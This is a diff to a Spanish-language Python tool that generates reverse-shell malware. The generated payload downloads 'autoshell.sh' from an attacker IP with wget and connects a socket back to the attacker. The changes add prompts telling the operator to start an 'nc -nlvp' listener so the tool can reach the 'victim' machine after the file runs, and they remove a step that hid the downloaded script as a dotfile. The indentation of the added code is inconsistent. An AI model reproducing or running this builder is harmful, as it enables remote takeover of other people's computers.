@@ -34,9 +34,7 @@ if numero == 1:
    viruspy = "import socket\n"\
              "import subprocess\n"\
              "cliente = socket.socket()\n"\
-             "archivo = os.getcwd()+\'/autoshell.sh\'\n"\
              "os.system('wget http://'+ ip +'/autoshell.sh')\n"\
-             "os.system('mv '+ archivo +' .autoshell.sh')\n"\
              "os.system('clear')\n"\
              "try:\n"\
              "   cliente.connect(("+ modify_ip +","+ puerto +"))\n"\
@@ -77,7 +75,11 @@ def option_listener_yes():
 
 
      else:
-        print("Sin listener no puedo conectarme al equipo victima :(")
+        print("""
+        Sin listener no puedo conectarme al equipo victima :(
+        Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.
+              """)
+
 
 if numero == 2:
    ip = input("""
@@ -152,9 +154,33 @@ if numero == 3:
       x = x.replace("ip", ""+ ip +"")
       x = x.replace("puerto", ""+ puerto +"")
       fin.write(x)
+              
+      
+  
+    option_listen = input("""
+    Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
+   
+    Quiere desplegar un listener?  [y/n] 
+   
+    >  """)
+         if option_listen == "y":
+            option_listener_yes()
 
 
+        if option_listen == "Y":
+             option_listener_yes()
 
+
+        else:
+            print("""
+            
+            Sin listener no puedo conectarme al equipo victima :(
+            Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.
+            """)
+                 
+
+
+    
 
    
    
